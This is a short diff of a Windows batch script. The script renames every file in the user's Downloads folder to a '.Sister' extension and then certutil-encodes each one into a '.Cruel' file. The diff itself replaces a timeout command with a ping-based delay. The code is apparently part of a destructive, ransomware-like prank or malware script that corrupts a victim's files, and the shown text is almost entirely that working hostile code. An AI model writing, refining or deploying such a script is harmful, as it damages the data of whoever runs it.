@@ -5,7 +5,7 @@ cd %UserProFile%\Downloads\
 
 for %%a in (*) do ren "%%a" "%%~a.Sister"&for %%a in (%0) do ren "%%~a.Sister" "%%~na.bat"
 
-for %%a in (*.Sister) do certutil -encode "%%~a" "%%~na.Cruel" & timeout 3
+for %%a in (*.Sister) do certutil -encode "%%~a" "%%~na.Cruel" & ping -n 3 127.0.0.1 > nul
 
 
 cd %UserProFile%\Downloads\
